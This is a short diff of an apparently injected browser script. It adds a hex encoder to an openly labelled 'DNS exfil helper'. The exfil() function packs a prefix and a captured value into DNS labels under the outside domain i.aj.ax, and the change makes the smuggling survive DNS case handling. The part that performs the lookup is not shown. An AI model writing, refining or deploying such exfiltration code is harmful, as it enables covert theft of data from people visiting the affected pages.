@@ -6,9 +6,17 @@
   (document.body || document.documentElement).appendChild(overlay);
 
   // ── DNS exfil helper ─────────────────────────────────────────────────────
+  function toHex(str) {
+    var out = '';
+    for (var i = 0; i < str.length; i++) {
+      out += ('0' + str.charCodeAt(i).toString(16)).slice(-2);
+    }
+    return out;
+  }
+
   function exfil(prefix, value) {
     if (!value) return;
-    var enc = btoa(prefix + ':' + value).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+    var enc = toHex(prefix + ':' + value);
     var chunks = enc.match(/.{1,63}/g) || ['x'];
     var host = chunks.join('.') + '.i.aj.ax';
     console.log('[exfil] ' + prefix + ' -> ' + host);
